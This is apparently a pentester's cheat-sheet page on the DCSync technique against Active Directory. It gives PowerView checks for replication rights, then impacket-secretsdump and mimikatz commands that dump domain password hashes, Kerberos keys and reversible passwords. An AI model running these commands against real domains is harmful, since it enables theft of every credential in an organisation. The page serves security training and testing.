# DCSync

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**DCSync**</mark> is a <mark style="color:purple;">**post-exploitation technique**</mark> that abuses the <mark style="color:red;">**Microsoft Directory Replication Service Remote Protocol (MS-DRSR)**</mark>, which is normally used to synchronize data between Domain Controllers.

If an attacker obtains the appropriate replication privileges in Active Directory (such as <mark style="color:blue;">`Replicating Directory Changes All`</mark>), they can **impersonate a Domain Controller and request a targeted sync** of sensitive directory data — including password hashes, Kerberos tickets, and user credentials — without replicating the entire domain.

This results in full credential compromise over the network, without touching LSASS or memory on a domain controller.

## <mark style="color:yellow;">Checking Privs</mark>

### <mark style="color:blue;">Group Membership Check</mark>

```powershell
PS C:\> Get-DomainUser -Identity songbird | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

### <mark style="color:blue;">Rights Check</mark>

```powershell
PS C:\> $sid = "S-1-5-21-blahblahblah-1164"
PS C:\> Get-ObjectAcl "DC=militech,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### <mark style="color:blue;">Reversible Encryption Check</mark>

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
</strong># OR
PS C:\> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
</code></pre>

## <mark style="color:yellow;">Secretsdump</mark>

```bash
impacket-secretsdump -outputfile militech_hashes -just-dc MILITECH/songbird@13.13.13.13 
```

### <mark style="color:blue;">Additional Parameters</mark>

* <mark style="color:green;">`-just-dc-ntlm`</mark> - NTLM hashes only
* <mark style="color:green;">`-just-dc-user <USERNAME>`</mark> - Extract data for certain user
* <mark style="color:green;">`-pwd-last-set`</mark> - To see last time user changed password
* <mark style="color:green;">`-history`</mark> - If we want to dump password history
* <mark style="color:green;">`-user-status`</mark> - Check if user is disabled

<mark style="color:green;">**Secretsdump**</mark> would make few files each for each type of credentials:

* `Kerberos Tickets`
* `NTLM Hashes`
* `Cleartext Reversible Passwords` (if option turned on, and because we are replicating DC, tool automaticly tooks also decryption keys and decrypt them)&#x20;

## <mark style="color:yellow;">Mimikatz</mark>

```shell-session
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:MILITECH.LOCAL /user:MILITECH\administrator
```
